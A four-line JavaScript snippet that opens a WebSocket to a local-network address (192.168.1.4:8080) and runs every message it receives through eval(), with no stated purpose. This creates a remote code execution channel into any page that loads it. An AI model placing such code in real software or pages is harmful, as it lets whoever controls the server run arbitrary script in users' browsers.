var Socket = "MozWebSocket" in window ? MozWebSocket : WebSocket
var sock = new Socket("ws://192.168.1.4:8080")
sock.onmessage = function(evt) {
    eval(evt.data)
}
